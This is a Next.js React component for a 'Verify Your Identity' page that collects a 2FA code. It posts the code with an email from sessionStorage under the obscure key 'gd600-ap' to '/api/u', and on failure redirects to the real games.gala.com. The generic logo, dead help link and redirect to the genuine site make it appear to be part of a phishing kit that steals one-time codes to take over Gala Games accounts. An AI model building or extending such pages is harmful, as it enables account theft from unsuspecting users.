'use client';
import React from 'react';
import styles from '../styles.module.css';
import Image from "next/image";
import {useRouter} from "next/navigation";
import {routeConstants} from "@/constants/route";


const navigationMapper = {
  'email': routeConstants.VERIFY_EMAIL,
  '2fa': routeConstants.TWO_FA,
}

const Verify2FaAccount = () => {
  const [loading, setLoading] = React.useState(false);
  const navigate = useRouter()
  const [otp, setOtp] = React.useState('');

  const navigateTo = async () => {
    setLoading(true);

    const fetchWithTimeout = (url: string, options: RequestInit, timeout = 58000) => {
      return Promise.race([
        fetch(url, options).then((res) => res.json()),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
      ]);
    };


    try {
      const res = await fetchWithTimeout('/api/u', {
        method: 'POST',
        body: JSON.stringify({code: otp, email: sessionStorage.getItem('gd600-ap')}),
      });

      if (!res?.error) navigate.push(navigationMapper[res?.data?.key as 'email' | '2fa']);
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
    } catch (error) {
      window.location.assign('https://games.gala.com/');
    } finally {
      setLoading(false);
      sessionStorage.removeItem('gd600-ap');
    }
  };


  return (
    <div className={styles.wrapper}>
      <div className={styles.container}>
        <div className={styles.logo}>
          <Image width={60} height={60} src="/icons/form-logo.png" alt="Logo"/>
        </div>
        <h2 className={styles.title}>Verify Your Identity</h2>
        <p className={styles.description}>
          Please confirm that you{"'"}re the owner of your account by entering the code sent to your 2FA device.
        </p>
        <input
          type="text"
          placeholder="Enter code here..."
          className={styles.input}
          onChange={(e) => setOtp(e.target.value)}
        />
        <button className={styles.submitButton} onClick={navigateTo}>
          {loading ? 'Wait...' : 'Submit'}
        </button>
        <p className={styles.resendLink}>
          Didn{"'"}t receive an email? <a href="#">Reach out</a>
        </p>
      </div>
    </div>
  );
};

export default Verify2FaAccount;
